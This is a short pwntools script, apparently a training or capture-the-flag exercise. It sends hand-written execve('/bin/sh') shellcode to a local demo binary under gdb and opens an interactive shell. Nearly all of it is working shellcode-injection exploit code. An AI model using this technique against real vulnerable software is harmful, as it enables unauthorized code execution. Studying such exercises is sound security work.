#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./demo_shellcode')

# execve("/bin/sh", 0, 0)
sc = asm("""
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx

mov rdi, 0x68732f6e69622f
mov qword ptr [rbp], rdi
mov rdi, rbp
syscall
""")

assert(len(sc) <= 0x30)

gdb.attach(r)
r.sendafter("Give me shellcode: ", sc)

r.interactive()